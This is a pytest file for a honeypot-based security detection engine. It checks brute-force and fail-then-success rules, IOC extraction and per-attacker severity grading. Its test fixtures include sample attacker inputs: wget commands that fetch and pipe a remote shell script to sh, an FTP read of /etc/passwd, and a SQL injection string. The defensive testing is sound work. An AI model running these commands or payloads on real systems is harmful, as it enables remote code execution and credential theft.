"""
Detection + correlation engine against the MariaDB test schema.

Seeds normalized_events, runs one detection cycle, asserts real Detection and
Incident rows appear with explainable reasons. Skips if the DB is unreachable.
"""

from datetime import datetime, timedelta

from sqlalchemy import select

from app.models.all_models import (
    Detection,
    Incident,
    IncidentEvent,
    IOCObservation,
    NormalizedEventModel,
    SystemConfig,
)
from app.services import detection_engine


def _mk(session_factory, run, events):
    async def _seed():
        async with session_factory() as db:
            for e in events:
                db.add(NormalizedEventModel(**e))
            await db.commit()
    run(_seed())


def _base(i, **over):
    now = datetime.utcnow()
    row = dict(
        event_id=f"ev-{i}",
        timestamp=now - timedelta(seconds=60 - i),
        ingested_at=now,
        sensor="cowrie",
        sensor_event_type="cowrie.login.failed",
        source_ip="203.0.113.50",
        destination_port=2222,
        protocol="ssh",
        severity="MEDIUM",
        authentication_result="FAILURE",
        raw_event="{}",
        event_metadata={},
    )
    row.update(over)
    return row


def test_brute_force_produces_detection_and_incident(soc_db):
    run, factory = soc_db
    _mk(factory, run, [_base(i) for i in range(7)])

    async def _cycle():
        async with factory() as db:
            return await detection_engine.run_cycle(db)
    summary = run(_cycle())
    assert summary["new_events"] == 7
    assert summary["detections"] >= 1

    async def _check():
        async with factory() as db:
            dets = (await db.execute(select(Detection))).scalars().all()
            incs = (await db.execute(select(Incident))).scalars().all()
            links = (await db.execute(select(IncidentEvent))).scalars().all()
            return dets, incs, links
    dets, incs, links = run(_check())

    assert any(d.rule_id == "st-auth-001" for d in dets)
    d = next(d for d in dets if d.rule_id == "st-auth-001")
    assert d.attack_technique == "T1110"
    assert d.source_ip == "203.0.113.50"
    assert d.reason and "st-auth-001" in d.reason and "threshold 5" in d.reason
    assert len(d.matched_event_ids) >= 5

    assert len(incs) == 1
    inc = incs[0]
    assert inc.correlation_key == "203.0.113.50"
    assert inc.severity in ("HIGH", "CRITICAL")
    assert "203.0.113.50" in (inc.source_ips or [])
    assert any("st-auth-001" in r for r in (inc.detection_reasons or []))
    assert inc.risk_breakdown and inc.risk_breakdown["total"] > 0
    assert links and all(le.correlation_reason for le in links)


def test_cycle_is_idempotent(soc_db):
    run, factory = soc_db
    _mk(factory, run, [_base(i) for i in range(7)])

    async def _cycle():
        async with factory() as db:
            return await detection_engine.run_cycle(db)

    run(_cycle())

    async def _count():
        async with factory() as db:
            return len((await db.execute(select(Detection))).scalars().all())
    first = run(_count())

    # second cycle: no new events -> cursor short-circuits, nothing added
    run(_cycle())
    assert run(_count()) == first

    async def _cursor():
        async with factory() as db:
            return (await db.execute(
                select(SystemConfig).where(SystemConfig.key == "detection_cursor")
            )).scalars().first()
    assert run(_cursor()) is not None


def test_ioc_extraction_from_command(soc_db):
    run, factory = soc_db
    ev = _base(0, sensor_event_type="cowrie.command.input", severity="HIGH",
               authentication_result=None,
               command="wget http://185.99.1.7/bot.sh; sha256sum " + "a" * 64)
    _mk(factory, run, [ev])

    async def _cycle():
        async with factory() as db:
            await detection_engine.run_cycle(db)
            return (await db.execute(select(IOCObservation))).scalars().all()
    iocs = run(_cycle())
    kinds = {i.type for i in iocs}
    values = {i.value for i in iocs}
    assert "url" in kinds and "http://185.99.1.7/bot.sh" in values
    assert "sha256" in kinds and ("a" * 64) in values
    assert "ip" in kinds and "203.0.113.50" in values


def test_sequence_rule_fires_on_fail_then_success(soc_db):
    run, factory = soc_db
    events = [_base(i) for i in range(4)]
    events.append(_base(9, sensor_event_type="cowrie.login.success",
                        authentication_result="SUCCESS", severity="HIGH"))
    _mk(factory, run, events)

    async def _cycle():
        async with factory() as db:
            await detection_engine.run_cycle(db)
            return (await db.execute(select(Detection))).scalars().all()
    dets = run(_cycle())
    assert any(d.rule_id == "st-cred-002" for d in dets)


def test_severity_is_graded_per_actor(soc_db):
    """
    Regression guard for "every incident is CRITICAL": five actors with very
    different behaviour must land in different bands. A lone MEDIUM rule stays
    MEDIUM; only corroborated or CRITICAL-rule activity reaches CRITICAL; and
    an FTP "RETR /etc/passwd" must not trip the web-attack rule.
    """
    run, factory = soc_db
    rows, n = [], [0]

    def add(ip, **over):
        n[0] += 1
        row = _base(n[0], source_ip=ip, authentication_result=None, severity="LOW")
        row.update(over)
        rows.append(row)

    for p in (445, 1433):                                   # drive-by: two connects
        add("10.1.0.1", sensor="dionaea", sensor_event_type="dionaea.connection.accept", destination_port=p)
    for p in (21, 80, 135, 443, 445, 1433, 3306, 5060):     # port scan
        add("10.1.0.2", sensor="dionaea", sensor_event_type="dionaea.connection.accept", destination_port=p)
    for _ in range(5):                                      # brute force -> breach
        add("10.1.0.3", sensor_event_type="cowrie.login.failed", authentication_result="FAILURE", severity="MEDIUM")
    add("10.1.0.3", sensor_event_type="cowrie.login.success", authentication_result="SUCCESS", severity="HIGH")
    add("10.1.0.3", sensor_event_type="cowrie.command.input", command="wget http://198.51.100.9/b.sh | sh", severity="HIGH")
    add("10.1.0.4", sensor="dionaea", sensor_event_type="dionaea.ftp.login", protocol="ftp",   # service creds
        destination_port=21, username="admin", password="Password1", severity="MEDIUM",
        payload="USER admin | PASS Password1 | RETR /etc/passwd | QUIT")
    add("10.1.0.5", sensor="honeytrap", sensor_event_type="honeytrap.http.request", protocol="http",  # web
        destination_port=8022, payload="GET /?id=1' OR '1'='1 | UA: sqlmap/1.7")
    _mk(factory, run, rows)

    async def _cycle():
        async with factory() as db:
            await detection_engine.run_cycle(db)
            incs = (await db.execute(select(Incident))).scalars().all()
            dets = (await db.execute(select(Detection))).scalars().all()
            return {i.correlation_key: i for i in incs}, dets
    incs, dets = run(_cycle())

    assert incs["10.1.0.1"].severity == "LOW"
    assert incs["10.1.0.1"].title.startswith("Honeypot activity")   # not "High-risk" on a LOW case
    assert incs["10.1.0.2"].severity == "MEDIUM"
    assert incs["10.1.0.3"].severity == "CRITICAL"
    assert incs["10.1.0.3"].title.startswith("Successful login after brute force")  # worst rule leads
    assert incs["10.1.0.4"].severity == "MEDIUM"
    assert incs["10.1.0.5"].severity == "HIGH"
    assert not any(d.source_ip == "10.1.0.4" and d.rule_id == "st-web-002" for d in dets)
